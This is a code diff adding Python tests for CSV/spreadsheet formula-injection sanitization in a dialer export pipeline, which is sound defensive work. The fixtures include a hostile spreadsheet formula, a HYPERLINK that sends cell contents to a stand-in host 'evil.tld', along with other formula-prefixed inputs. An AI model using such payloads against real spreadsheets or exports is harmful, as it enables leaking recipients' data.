@@ -4,6 +4,7 @@ Tests the pure, security-critical pieces: contact-only invariant, host pinning,
 credential validation, the DNC label, and the outbox transport's host-allowlist
 rejection + contact-id extraction.
 """
+import json
 from types import SimpleNamespace
 
 import pytest
@@ -123,3 +124,60 @@ def test_extract_contact_id_pulls_only_id_never_body():
     r3.status_code = 200
     r3._content = b"not json"
     assert _extract_contact_id(r3) is None
+
+
+def test_phoneburner_neutralizes_county_formula_text_but_not_the_phone():
+    """County records are untrusted input and PhoneBurner contacts get exported
+    to Excel, so a formula-leading owner name must arrive inert.
+
+    The negative half is equally load-bearing: E.164 phone numbers start with
+    "+", which is itself a formula prefix. Sanitizing the phone would yield
+    "'+1..." and break dialing -- a functional regression bought for no real
+    protection, since phone/email come from the enrichment provider rather than
+    from county HTML.
+    """
+    hostile = '=HYPERLINK("https://evil.tld/x?d="&A1&A2,"Open")'
+    lead = {
+        **_LEAD,
+        "party_name": hostile,
+        "property_address": "@SUM(1+1)*cmd",
+        "mailing_address": "+1 EVIL WAY",
+        "phone": "+14255551212",
+    }
+    body = PhoneBurnerConnector().build_requests([lead], _META)[0]["body"]
+
+    # Free text is neutralized wherever it lands.
+    assert body["first_name"].startswith("'")
+    assert body["last_name"].startswith("'")
+    assert body["address"].startswith("'")
+    assert body["custom_fields"]["owner_name"].startswith("'")
+    assert body["custom_fields"]["mailing_address"].startswith("'")
+    # The formula text itself is preserved after the guard character, so no data
+    # is lost -- it is disarmed, not dropped.
+    assert "HYPERLINK" in body["custom_fields"]["owner_name"]
+
+    # ...and the dialable field is untouched.
+    assert body["phone_number"] == "+14255551212"
+
+
+def test_generic_webhook_does_not_sanitize_json_by_design():
+    """Pins the deliberate asymmetry with PhoneBurner so it cannot be silently
+    "corrected" later. JSON is not an injection context; apostrophe-prefixing
+    here would corrupt the canonical value for every consumer that pipes this
+    into a CRM or database and never opens a spreadsheet.
+    """
+    from src.workers.dialer_connectors.generic_webhook import GenericWebhookConnector
+
+    hostile = '=HYPERLINK("https://evil.tld",“x”)'
+    meta = {
+        **_META,
+        "job_id": "22222222-2222-2222-2222-222222222222",
+        "scraper_config_id": "33333333-3333-3333-3333-333333333333",
+        "scraper_name": "s",
+        "total_dialer_ready_count": 1,
+        "dialer_webhook_url": "https://example.com/hook",
+    }
+    reqs = GenericWebhookConnector().build_requests([{**_LEAD, "party_name": hostile}], meta)
+    emitted = json.dumps(reqs[0])
+    assert "'=HYPERLINK" not in emitted, "generic webhook must NOT apostrophe-prefix"
+    assert "=HYPERLINK" in emitted, "the raw canonical value must survive intact"
